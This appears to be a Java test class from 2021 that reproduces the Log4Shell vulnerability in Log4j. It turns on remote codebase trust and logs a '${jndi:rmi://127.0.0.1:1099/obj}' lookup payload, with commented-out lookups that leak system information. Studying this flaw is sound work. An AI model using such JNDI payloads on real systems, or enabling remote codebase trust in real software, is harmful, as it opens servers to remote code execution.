package test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Created by gatesma on 2021/12/12.
 */
public class TestLog4j {

    public static final Logger log = LogManager.getLogger(TestLog4j.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        log.error("user ${jndi:rmi://127.0.0.1:1099/obj}");
        //log.error("${java:hw}");
        //log.error("${java:vm}");

//        Person person = new Person();

    }


}
